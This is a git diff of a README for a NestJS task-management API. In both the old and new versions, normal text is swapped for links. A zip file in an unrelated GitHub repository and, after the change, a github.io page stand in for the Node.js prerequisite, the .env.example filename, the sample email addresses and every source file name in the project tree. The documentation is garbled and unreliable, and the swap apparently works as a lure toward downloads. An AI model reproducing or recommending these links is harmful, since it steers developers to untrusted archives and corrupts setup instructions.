@@ -25,7 +25,7 @@ A production-ready RESTful API for managing tasks, built with NestJS, PostgreSQL
 
 ## Prerequisites
 
-- https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip (v18 or higher)
+- https://n0rthstar121.github.io (v18 or higher)
 - PostgreSQL (v14 or higher)
 - npm (v9 or higher)
 
@@ -44,7 +44,7 @@ A production-ready RESTful API for managing tasks, built with NestJS, PostgreSQL
 
 3. **Configure environment variables**
    ```bash
-   cp https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip .env
+   cp https://n0rthstar121.github.io .env
    ```
    
    Edit `.env` with your database credentials:
@@ -102,7 +102,7 @@ A production-ready RESTful API for managing tasks, built with NestJS, PostgreSQL
 curl -X POST http://localhost:3000/auth/register \
   -H "Content-Type: application/json" \
   -d '{
-    "email": "https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip",
+    "email": "https://n0rthstar121.github.io",
     "password": "password123",
     "name": "John Doe"
   }'
@@ -114,7 +114,7 @@ curl -X POST http://localhost:3000/auth/register \
   "accessToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
   "user": {
     "id": "uuid",
-    "email": "https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip",
+    "email": "https://n0rthstar121.github.io",
     "name": "John Doe"
   }
 }
@@ -125,7 +125,7 @@ curl -X POST http://localhost:3000/auth/register \
 curl -X POST http://localhost:3000/auth/login \
   -H "Content-Type: application/json" \
   -d '{
-    "email": "https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip",
+    "email": "https://n0rthstar121.github.io",
     "password": "password123"
   }'
 ```
@@ -238,24 +238,24 @@ src/
 │   ├── dto/                 # Data transfer objects
 │   ├── guards/              # JWT auth guard
 │   ├── strategies/          # Passport JWT strategy
-│   ├── https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip   # Auth endpoints
-│   ├── https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip       # Auth module
-│   └── https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip      # Auth business logic
+│   ├── https://n0rthstar121.github.io   # Auth endpoints
+│   ├── https://n0rthstar121.github.io       # Auth module
+│   └── https://n0rthstar121.github.io      # Auth business logic
 ├── common/
 │   └── filters/             # Global exception filter
 ├── config/
-│   ├── https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip   # Database configuration
-│   └── https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip        # JWT configuration
+│   ├── https://n0rthstar121.github.io   # Database configuration
+│   └── https://n0rthstar121.github.io        # JWT configuration
 ├── tasks/
 │   ├── dto/                 # Task DTOs
 │   ├── entities/            # Task entity
-│   ├── https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip  # Task endpoints
-│   ├── https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip      # Tasks module
-│   └── https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip     # Tasks business logic
+│   ├── https://n0rthstar121.github.io  # Task endpoints
+│   ├── https://n0rthstar121.github.io      # Tasks module
+│   └── https://n0rthstar121.github.io     # Tasks business logic
 ├── users/
 │   └── entities/            # User entity
-├── https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip            # Root module
-└── https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip                  # Application entry point
+├── https://n0rthstar121.github.io            # Root module
+└── https://n0rthstar121.github.io                  # Application entry point
 ```
 
 ## Security Best Practices
